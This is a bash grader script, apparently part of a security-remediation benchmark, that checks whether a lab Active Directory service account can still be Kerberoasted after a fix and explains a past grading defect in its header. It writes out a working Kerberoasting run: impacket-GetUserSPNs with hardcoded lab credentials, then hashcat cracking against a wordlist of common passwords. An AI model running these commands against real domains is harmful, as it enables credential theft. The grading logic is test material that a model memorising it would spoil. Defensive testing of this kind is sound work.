#!/usr/bin/env bash
# meta4/ad-vm/scenario-03/verify-poc.sh
# PASS (exit 0) iff svc_sql cannot be RC4-Kerberoasted.
#
# THE VERDICT NO LONGER DEPENDS ON CRACKING THE PASSWORD.
#
# It used to. The final branch was:
#
#   "RC4 hash dumped but pwd survived the seed wordlist -- PoC BLOCKED"; exit 0
#
# so a host that handed out an RC4 TGS for a service account -- the entire
# vulnerability -- graded as remediated whenever a 9-entry wordlist missed.
# This is the same defect scenario-04's header calls its worst one, and the
# 2026-07-26 gate run caught it: gate 1 FAILED because the fully vulnerable
# baseline scored BLOCKED, making the scenario unwinnable in the direction
# that matters.
#
# Two things were being conflated. Kerberoasting exposure is "an RC4 TGS is
# obtainable for an SPN-bearing account"; that is a configuration property and
# is what this scenario injects. Whether a given password survives a given
# wordlist is a password-policy question, and grading on it made the verdict a
# function of wordlist coverage and of whether hashcat had a working OpenCL
# device rather than of the host's configuration.
#
# The old header already proposed exactly this ("the cleaner design is to grade
# on 'is an RC4 TGS obtainable at all'"); the gate run supplied the evidence to
# stop deferring it.
#
# Safe for gate 2: reference-fix.ps1 sets svc_sql to AES128,AES256 and asserts
# RC4 is gone, so after the fix no RC4 TGS comes back and the AES-only branch
# below fires. The password reset in that fixture remains good practice, it is
# simply no longer what is being measured.
#
# Cracking is still ATTEMPTED, because a recovered cleartext is the most
# legible possible evidence -- but it can only strengthen a FAIL, never turn
# one into a PASS.

set -uo pipefail

for t in /usr/bin/impacket-GetUserSPNs; do
    if [ ! -x "$t" ]; then
        echo "[verify-poc-03] HARNESS ERROR: $t missing or not executable" >&2
        exit 2
    fi
done

cd "$(mktemp -d)" || { echo "[verify-poc-03] HARNESS ERROR: mktemp failed" >&2; exit 2; }

/usr/bin/impacket-GetUserSPNs \
    -request -dc-ip 10.20.30.5 \
    -outputfile ks.hashes \
    'corp.local/alice:Password1!' 2>&1 | tee ks.out || true

echo "--- GetUserSPNs output ---"
cat ks.out
echo "--- /GetUserSPNs ---"

# --- cannot reach the DC: HARNESS ERROR, never a verdict ---
if grep -qiE 'Connection refused|Network is unreachable|timed out|Errno 11[013]|Name or service not known|KRB_AP_ERR_SKEW' ks.out; then
    echo "[verify-poc-03] HARNESS ERROR: cannot query the DC for SPNs" >&2
    exit 2
fi

# --- no roastable account at all ---
if [ ! -s ks.hashes ]; then
    if grep -qiE 'cannot find spn|no user found|no entries found' ks.out; then
        echo "[verify-poc-03] no roastable account for svc_sql -- BLOCKED"
        exit 0
    fi
    echo "[verify-poc-03] empty TGS dump with no recognised denial - INCONCLUSIVE, grading FAIL" >&2
    echo "[verify-poc-03] an empty dump is what a broken probe produces, not proof of a fix" >&2
    exit 1
fi

# --- AES-only: the RC4 roasting path is closed ---
if grep -qE '\$krb5tgs\$18' ks.hashes && ! grep -qE '\$krb5tgs\$23\$' ks.hashes; then
    echo "[verify-poc-03] only AES TGS returned -- RC4 path closed, BLOCKED"
    exit 0
fi

# --- no RC4 and no recognised denial ---
if ! grep -qE '\$krb5tgs\$23\$' ks.hashes; then
    echo "[verify-poc-03] no RC4 TGS and no recognised denial - INCONCLUSIVE, grading FAIL" >&2
    echo "[verify-poc-03] an empty TGS dump is not proof that Kerberoasting was blocked" >&2
    exit 1
fi

# ---------------------------------------------------------------------------
# An RC4 TGS was obtained. That IS the finding; everything below is evidence
# gathering and cannot change the verdict.
# ---------------------------------------------------------------------------
if command -v hashcat >/dev/null 2>&1; then
    cat > wl <<'EOF'
Password1!
Autumn24
Summer24
Winter24
Spring24
Welcome1
Welcome24
Service123
Service24
EOF
    CRACK=$(timeout 45 hashcat -m 13100 -a 0 --quiet --potfile-path=/dev/null ks.hashes wl 2>&1 || true)
    echo "--- hashcat output (informational) ---"
    echo "$CRACK"

    if echo "$CRACK" | grep -qE '\$krb5tgs\$23\$.*:[A-Za-z0-9!]+$'; then
        PW=$(echo "$CRACK" | grep -oE ':[^:]+$' | tail -1 | tr -d ':')
        echo "[verify-poc-03] cracked svc_sql password '$PW'" >&2
    elif echo "$CRACK" | grep -qiE 'No devices found/left|requires? this runtime|OpenCL.*not (found|available)|No OpenCL compatible'; then
        # No longer a harness error: the verdict does not depend on cracking.
        echo "[verify-poc-03] (hashcat has no usable OpenCL device; crack skipped)" >&2
    else
        echo "[verify-poc-03] (seed wordlist did not recover the password)" >&2
    fi
else
    echo "[verify-poc-03] (hashcat unavailable; crack skipped)" >&2
fi

echo "[verify-poc-03] RC4 TGS obtainable for svc_sql -- Kerberoasting PoC SUCCEEDED" >&2
echo "[verify-poc-03] an SPN account issuing RC4 tickets is roastable offline regardless of password strength" >&2
exit 1
